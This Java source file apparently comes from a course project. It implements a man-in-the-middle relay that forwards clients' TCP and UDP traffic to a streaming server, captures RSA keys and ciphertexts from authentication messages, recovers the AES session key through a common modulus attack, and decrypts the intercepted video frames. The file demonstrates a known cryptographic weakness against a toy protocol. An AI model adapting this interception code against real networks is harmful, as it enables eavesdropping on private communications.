package Attacker;

import java.awt.Dimension;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.math.BigInteger;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Arrays;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.SwingWorker;

import Utility.RSA;
import Utility.SHA1;
import Utility.AES;

public class JavaAttacker {
	/* 
	 * Attacker connects to Server
	 * Attacker listens for clients, create a separate forward thread for different clients
	 */
	private static final int SERVER_UDP_PORT = 4321;
	private static final int SERVER_TCP_PORT = 6782;
	private static final int ATTACKER_TCP_PORT = 6783;
	private static final int ATTACKER_UDP_PORT = 4322;

	private AttackerView attackerView;
	private UpdateAttackView updateView;
	private InetAddress serverIP;
	private DatagramSocket ds;
	private ServerSocket attackerSocket;
	// ArrayList of threads for forwarding TCP data
	private ArrayList<ForwardTCP> handleClientTCP = new ArrayList<ForwardTCP>();
	// ArrayList of threads for forwarding UDP data
	private ArrayList<ForwardUDP> handleClientUDP = new ArrayList<ForwardUDP>();
	// Current session key
	private AES aes;

	// 2 public keys required to perform attack
	private BigInteger[] publicKeys = new BigInteger[2];
	// 2 ciphers required to perform attack
	private String[] ciphers = new String[2];
	// common modulus
	private BigInteger modulus;
	public static Vidshow vidShow;

	// Port used by attacker to fake UDP connections
	private int fakePort = 7000;

	public JavaAttacker() {
		attackerView = new AttackerView(this);
		attackerView.showAttackerView();
		updateView = new UpdateAttackView(this);
	}

	// Attacker starts and connects to Server
	public void run(String address) {
		SwingWorker<Void, Void> worker = new SwingWorker<Void, Void>() {
			protected Void doInBackground() {
				try {
					publicKeys[0] = null;
					publicKeys[1] = null;
					ciphers[0] = null;
					ciphers[1] = null;
					modulus = null;
					aes = null;

					serverIP = InetAddress.getByName(address);
					attackerView.hideAttackerView();

					updateView.show();
					updateView.updateText("Successfully get server IP: " + serverIP + "\n");

					ds = new DatagramSocket(ATTACKER_UDP_PORT);

					// Attacker start server 
					attackerSocket = new ServerSocket (ATTACKER_TCP_PORT);
					Socket clientSocket = null;

					updateView.updateText("Start listening for clients at " + InetAddress.getLocalHost().getHostAddress() + "\n");

					int count = 1;

					// Attacker listens for clients
					while (true) {
						byte[] buf = new byte[62000];
						DatagramPacket rcv = new DatagramPacket (buf, buf.length);
						ds.receive(rcv);
						byte[] data = Arrays.copyOfRange(buf, 0, rcv.getLength());

						updateView.updateText("New client connected (" + count + ")\n");
						count++;

						// Attacker creates a forward UDP thread
						ForwardUDP handleUDP = new ForwardUDP(fakePort, rcv.getAddress(), rcv.getPort(), data, serverIP, SERVER_UDP_PORT);
						handleUDP.start();
						handleClientUDP.add(handleUDP);
						fakePort++;

						clientSocket = attackerSocket.accept();
						// Attacker creates a forward TCP thread to handle the forwarding
						ForwardTCP handleTCP = new ForwardTCP (clientSocket, serverIP, SERVER_TCP_PORT);
						handleTCP.start();
						handleClientTCP.add(handleTCP);
					}
				}
				catch (UnknownHostException e) {
					attackerView.showMessage("Invalid IP address");
				}
				catch (Exception e) {
					e.printStackTrace();
					System.exit(-1);
				}
				return null;
			}
		};
		worker.execute();
	}

	private void setModulus (BigInteger modulus) {
		this.modulus = modulus;
		updateView.updateText("Obtain modulus: " +  modulus  + "\n");
	}

	private void setPublicKey (BigInteger publicKey) {
		if (publicKeys[0] == null)
			publicKeys[0] = publicKey;
		else
			publicKeys[1] = publicKey;

		updateView.updateText("Obtain new public key: " +  publicKey + "\n");

		if (isReadyToAttack())
			attack();
	}

	private void setCipher (String cipher) {
		if (ciphers[0] == null)
			ciphers[0] = cipher;
		else 
			ciphers[1] = cipher;

		updateView.updateText("Obtain new cipher text: " +  cipher + "\n");

		if (isReadyToAttack())
			attack();
	}

	private boolean isReadyToAttack() {
		if (publicKeys[0] != null && publicKeys[1] != null && ciphers[0] != null && ciphers[1] != null && modulus != null)
			return true;
		else
			return false;
	}

	// Trying to break RSA using common modulus attack
	private void attack() {
		SwingWorker<Void, Void> worker = new SwingWorker<Void, Void>() {
			protected Void doInBackground() {
				updateView.updateText("Starting common modulus attack\n");

				String sessionKey = new RSA().commonModulusAttack(ciphers[0], ciphers[1], publicKeys[0], publicKeys[1], modulus);
				if (sessionKey != null) {
					updateView.updateText("Successfully get the session key: " + sessionKey + "\n");
					aes = new AES(Arrays.copyOf(new SHA1().hexaStringToByteArray(sessionKey), 16));
					
					updateView.updateWatchVideoButton();
				} else {
					// TODO need to decide how attacker continue when cannot launch attack
					updateView.updateText("Cannot launch a common modulus attack with these data");
				}
				
				return null;
			}
		};
		worker.execute();
	}
	
	public void showVideo() {
		SwingWorker<Void, Void> worker = new SwingWorker<Void, Void>() {
			protected Void doInBackground() {
				updateView.hide();
				vidShow = new Vidshow(aes);
				vidShow.start();
				vidShow.show();
			
				return null;
			}
		};
		worker.execute();
	}

	private class Vidshow extends Thread {
		private JFrame jf = new JFrame();
		private JPanel jp = new JPanel();
		private JLabel jl = new JLabel();

		private BufferedImage bf;
		private ImageIcon imc;
		private byte[] currentFrame = null;
		private AES aes;

		public Vidshow(AES aes) {
			jf.setTitle("RSA ATTACKER");
			jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
			jf.setAlwaysOnTop(true);
			
			jp.setPreferredSize(new Dimension(640, 380));
			jp.add(jl);
			jf.add(jp);
			jf.pack();

			this.aes = aes;
		}

		public void show() {
			jf.setVisible(true);
		}

		public byte[] getCurrentFrame() {
			return currentFrame;
		}

		public void setCurrentFrame(byte[] frame) {
			currentFrame = frame.clone();
		}

		@Override
		public void run() {
			SwingWorker<Void, Void> worker = new SwingWorker<Void, Void>() {
				protected Void doInBackground() {
					try {
						do {
							if (currentFrame != null) {
								// decrypt using AES
								byte[] frame = currentFrame.clone();
								frame = aes.decrypt(frame);

								ByteArrayInputStream bais = new ByteArrayInputStream(frame);

								bf = ImageIO.read(bais);

								if (bf != null) {
									imc = new ImageIcon(bf);
									jl.setIcon(imc);

									Thread.sleep(15);
								}
								jf.revalidate();
								jf.repaint();
							}
						} while (true);
					}
					catch (Exception e) {
						e.printStackTrace();
					}
					return null;
				}
			};
			worker.execute();
		}
	}

	private class ForwardUDP extends Thread {
		private InetAddress clientAddr;
		private int clientPort;
		private int fakePort;
		private DatagramSocket socket;
		private byte[] buffer = new byte[62000];
		private DatagramPacket rcv;

		public ForwardUDP (int fakePort, InetAddress clientAddr, int clientPort, byte[] data, InetAddress serverAddr, int serverPort)  throws Exception {
			this.fakePort = fakePort;
			this.clientPort = clientPort;
			this.clientAddr = clientAddr;
			this.socket = new DatagramSocket(this.fakePort);
			this.rcv = new DatagramPacket(buffer, buffer.length);

			DatagramPacket pck = new DatagramPacket (data, data.length, serverAddr, serverPort);
			socket.send(pck);
		}

		public void run() {
			try {
				while (true) {
					socket.receive(rcv);

					// remove empty bytes in buffer 
					byte[] data = Arrays.copyOfRange(buffer, 0, rcv.getLength());

					if (vidShow != null) {
						if (!Arrays.equals(data, vidShow.getCurrentFrame()))
							vidShow.setCurrentFrame(data);
					}

					DatagramPacket pk = new DatagramPacket(data, data.length, clientAddr, clientPort);
					socket.send(pk);
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	private class ForwardTCP extends Thread {
		private Socket clientSocket;
		private DataOutputStream outToServer;
		private BufferedReader inFromServer;
		private DataOutputStream outToClient;
		private BufferedReader inFromClient;
		private Socket socketToServer;

		public ForwardTCP (Socket clientSocket, InetAddress serverAddr, int serverPort) throws Exception {
			this.clientSocket = clientSocket;
			this.inFromClient = new BufferedReader(new InputStreamReader(this.clientSocket.getInputStream()));
			this.outToClient = new DataOutputStream (this.clientSocket.getOutputStream());

			socketToServer = new Socket(serverAddr, serverPort);
			this.inFromServer = new BufferedReader(new InputStreamReader(this.socketToServer.getInputStream()));
			this.outToServer = new DataOutputStream (this.socketToServer.getOutputStream());
		}

		public void run() {
			try {
				while (true) {
					String clientSentence = inFromClient.readLine();

					String[] str = clientSentence.split("[|]");
					if (str[0].equals("Authentication")) { 				
						clientSentence = clientSentence + "\n";
						outToServer.writeBytes(clientSentence);
						outToServer.flush();

						String serverResponse = inFromServer.readLine();

						// Intercept packet
						if (!isReadyToAttack()) {
							// get public key
							setModulus(new BigInteger(str[4]));
							setPublicKey(new BigInteger(str[3]));

							String[] str1 = serverResponse.split("[,]");
							if (str1[0].equals("granted"))
								setCipher(str1[1]);
						} 
						serverResponse = serverResponse + "\n";
						outToClient.writeBytes(serverResponse);
					}
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}
		} 
	}

	public static void main(String[] args) {
		new JavaAttacker();
	}
}